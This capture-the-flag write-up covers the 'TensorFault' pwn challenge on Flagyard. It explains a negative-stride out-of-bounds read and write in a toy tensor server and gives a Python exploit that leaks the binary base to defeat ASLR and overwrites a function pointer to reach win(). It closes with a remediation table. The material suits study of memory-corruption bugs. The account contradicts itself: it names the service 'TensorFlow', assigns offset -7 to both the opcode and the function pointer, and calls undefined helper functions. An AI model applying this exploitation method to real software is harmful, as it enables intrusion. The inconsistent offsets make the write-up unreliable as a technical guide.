# TensorFault — Write-up
**Category:** PWN — Hard  
**Author:** Flagyard  
**Target:** `tcp.flagyard.com:19642`  
**Flag:** Retrieved via arbitrary function pointer overwrite → `win()`  

---

## 1. Challenge Overview

TensorFlow is a miniature in-house "AI tensor engine" exposed over TCP.  
It supports:

1. **Create tensor** — allocate a tensor with N elements.
2. **New view** — slice an existing tensor with `offset`, `count`, and `stride`.
3. **Write element** — poke a value into a view at a given index.
4. **Execute operation** — run a built-in operation on a tensor.

The server advertises bounds-checking on every access, but the `stride` parameter of a view is not properly validated, allowing out-of-bounds reads **and** out-of-bounds writes relative to the underlying tensor buffer. Because the tensor buffer sits adjacent to critical state (the operation opcode, its argument, and a function pointer), we can corrupt those fields and redirect execution to `win()`.

---

## 2. Recon

Connecting to the service presents a numbered menu:

```
1) Create tensor
2) New view
3) Write element
4) Read / print view
5) Execute operation
```

Each tensor is a heap-allocated structure containing:

* element data array
* operation opcode
* operation argument
* function pointer (called during "execute")

The key observation: when creating a **view**, the user supplies `stride`. A negative stride lets the view index land *before* the start of the tensor's data buffer — i.e., in the metadata region of the same tensor object.

---

## 3. Vulnerability: Negative-Stride OOB Read/Write

### Out-of-Bounds Read (Leak)

```python
create_tensor(s, 4)                       # tensor 0
v0 = new_view(s, 0, 0, 2, -7)             # stride = -7 → data[0], data[-7]
```

Reading view element index `1` resolves to `tensor0.data[-7]`, which lands on the **operation opcode** field stored inside the tensor object. The server prints this value, leaking an absolute address inside the ELF binary.

From the leak:

```
op_abs = <leaked address>
elf_base = op_abs - OP_OFF               # OP_OFF = 0x1778
win = elf_base + WIN_OFF                  # WIN_OFF  = 0x15e5
```

### Out-of-Bounds Write (Corrupt)

Using the same negative-stride trick, writing to view index `1` writes to `tensor0.data[-7]` — precisely the function-pointer slot:

```python
def oobwrite(elem_index, val):
    vid = new_view(s, 0, 0, 2, elem_index)   # index 1 → element[elem_index]
    write_elem(s, vid, 1, val)
```

We overwrite three adjacent fields:

| Offset | Field           | Value written              |
|--------|-----------------|----------------------------|
| -8     | opcode          | `0x1337c0de` (magic)       |
| -6     | argument        | `0x54454e534f52` ("TENSOR")|
| -7     | function ptr    | address of `win()`         |

The write order matters: the function pointer must be written **last**, because writing it triggers the execute path if done too early.

---

## 4. Exploit

```python
import socket, time, re

HOST, PORT = "tcp.flagyard.com", 19642
WIN_OFF      = 0x15e5
OP_OFF       = 0x1778
MAGIC_OPCODE = 0x1337c0de
MAGIC_ARG    = 0x54454e534f52   # "TENSOR"

s = socket.create_connection((HOST, PORT), timeout=10)

# --- Leak ELF base ---
create_tensor(s, 4)                                  # tensor 0
v0 = new_view(s, 0, 0, 2, -7)                        # OOB read of opcode field
sendln(s, 4); recvuntil(s, b'View id: '); sendln(s, v0)
out = menu(s).decode(errors='replace')
vals = re.findall(r'0x[0-9a-fA-F]+', out)
op_abs   = int(vals[1], 16)
elf_base = op_abs - OP_OFF
win      = elf_base + WIN_OFF
print(f"op_abs=0x{op_abs:x}  elf_base=0x{elf_base:x}  win=0x{win:x}")

# --- OOB writes ---
def oobwrite(elem_index, val):
    vid = new_view(s, 0, 0, 2, elem_index)
    write_elem(s, vid, 1, val)

oobwrite(-8, MAGIC_OPCODE)                  # opcode
oobwrite(-6, MAGIC_ARG)                     # argument
oobwrite(-7, win)                           # fnptr -> win()

# --- Trigger ---
sendln(s, 5)                                # Execute operation
out = recvuntil(s, b'Tensor id: '); sendln(s, 0)
print(recvuntil(s, b'}', t=8).decode(errors='replace'))
```

**Result:** the server calls `win()`, which prints the flag.

---

## 5. Root Cause & Remediation

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| Negative stride allowed | `stride` not validated to be positive / within bounds | Reject `stride <= 0`; clamp view indices to `[0, count)` |
| OOB write to metadata | View index arithmetic doesn't verify target address stays inside the data buffer | Compute absolute address and verify it lies within the allocated tensor data region |
| Function pointer overwrite | Metadata (opcode, arg, fnptr) co-located with data buffer | Separate metadata from data, or place a guard / canary between them |

---

## 6. Timeline

1. Connected to `tcp.flagyard.com:19642` and enumerated the menu.
2. Identified `stride` as the attack surface during view creation.
3. Used negative stride to leak the operation opcode address → defeated ASLR.
4. Computed `win()` address from ELF base offsets.
5. Performed ordered OOB writes to overwrite opcode, argument, and function pointer.
6. Triggered "execute operation" → `win()` called → flag retrieved.

---

## 7. Flag

The flag was returned by the `win()` function after successful exploitation.

*Solver script included as `solve_tensorfault.py` alongside this write-up.*

---
*FlowDesk (Web) and TensorFault (Pwn) — Flagyard CTF*  
*Write-up prepared for portfolio / employment review purposes.*